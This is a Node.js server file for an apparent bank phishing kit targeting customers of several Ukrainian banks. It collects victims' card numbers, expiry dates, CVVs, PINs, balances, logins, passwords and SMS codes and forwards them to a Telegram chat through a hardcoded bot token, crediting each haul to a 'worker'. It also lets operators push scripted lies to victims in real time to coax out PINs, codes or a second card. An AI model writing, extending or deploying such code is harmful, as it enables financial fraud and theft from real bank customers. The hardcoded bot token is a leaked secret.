const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// НАСТРОЙКИ
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

// Динамическое определение WEBHOOK_URL
const getWebhookUrl = () => {
    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = process.env.HOST || req.headers.host.split(':')[0] || 'localhost';
    const port = process.env.PORT || 3000;
    return `${protocol}://${host}:${port}/bot${TELEGRAM_BOT_TOKEN}`;
};

const banksForRequestButton = [
    'Райффайзен', 'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Логирование запросов
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

// Обслуживание файлов
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Установка webhook
const WEBHOOK_URL = getWebhookUrl();
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// Тестовое сообщение
bot.sendMessage(CHAT_ID, `ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// Тест бота
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook для Telegram
app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected via WS');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());
            console.log('WS message from client:', data);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing WS message:', e);
        }
    });
    ws.on('close', (event) => {
        console.log('WS close:', event.code, event.reason);
        for (let [sid, clientWs] of clients.entries()) {
            if (clientWs === ws) {
                clients.delete(sid);
                console.log(`Client disconnected: ${sid}`);
                break;
            }
        }
    });
    ws.on('error', (error) => {
        console.error('WebSocket server error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit received:', req.body);
    const { sessionId, isFinalStep, bankName, referrer, ...stepData } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: bank=${bankName}, isFinal=${isFinalStep}, keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, bankName, ...stepData };
    sessions.set(sessionId, newData);

    if (isFinalStep) {
        console.log(`FINAL LOG for ${bankName} session ${sessionId}`);
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }
        sessions.set(sessionId, newData);

        let message = '<b>Новий запис!</b>\n\n';
        message += `<b>Назва банку:</b> ${newData.bankName || bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card_simple || newData.card || 'Не вказано'}</code>\n`;
        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        if (newData.phone_login || newData.login) message += `<b>Логін:</b> <code>${newData.phone_login || newData.login || 'Не вказано'}</code>\n`;
        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
        message += `<b>Кількість переходів:</b> ${visitText}\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;

        sendToTelegram(message, sessionId, newData.bankName || bankName);
    }

    res.status(200).json({ message: 'OK', receivedBank: bankName });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = '<b>Отримано SMS!</b>\n\n';
        message += `<b>Код:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

app.post('/api/command', async (req, res) => {
    console.log('API /command received:', req.body);
    const { sessionId, type, data } = req.body;
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type, data }));
        res.json({ success: true, message: 'Command sent via WS' });
    } else {
        console.log('WS not available, using HTTP fallback for', sessionId);
        try {
            await fetch(`/api/submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, isFinalStep: false, command: { type, data } })
            });
            res.json({ success: true, message: 'Command sent via HTTP fallback' });
        } catch (error) {
            res.status(500).json({ success: false, message: 'Command failed' });
        }
    }
});

function sendToTelegram(message, sessionId, bankName) {
    console.log(`Sending TG message for ${bankName} session ${sessionId}`);
    const keyboard = [
        [
            { text: 'SMS', callback_data: `command:sms:${sessionId}` },
            { text: 'ДОДАТОК', callback_data: `command:app:${sessionId}` }
        ],
        [
            { text: 'ПІН', callback_data: `command:pin_error:${sessionId}` },
            { text: 'КОД', callback_data: `command:code_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `command:timer:${sessionId}` }
        ],
        [
            { text: 'Карта', callback_data: `command:card_error:${sessionId}` },
            { text: 'Номер', callback_data: `command:number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `command:other:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `command:request_details:${sessionId}` });
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', async (callbackQuery) => {
    console.log('Callback query:', callbackQuery.data);
    const [action, type, sessionId] = callbackQuery.data.split(':');
    if (action === 'command') {
        const data = {};
        switch (type) {
            case 'sms': data.text = "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду"; break;
            case 'app': data.text = "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації."; break;
            case 'other': data.text = "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку"; break;
            case 'pin_error': data.text = "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод"; break;
            case 'card_error': data.text = "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно"; break;
            case 'number_error': data.text = "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки."; break;
            case 'request_details': data.isRaiffeisen = sessions.get(sessionId)?.bankName === 'Райффайзен'; break;
            case 'code_error': data.error = true; break;
            case 'timer': data.timer = true; break;
        }
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, type, data })
        });
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    }
});

bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';
server.listen(PORT, HOST, () => {
    console.log(`Server running on ${HOST}:${PORT}`);
});
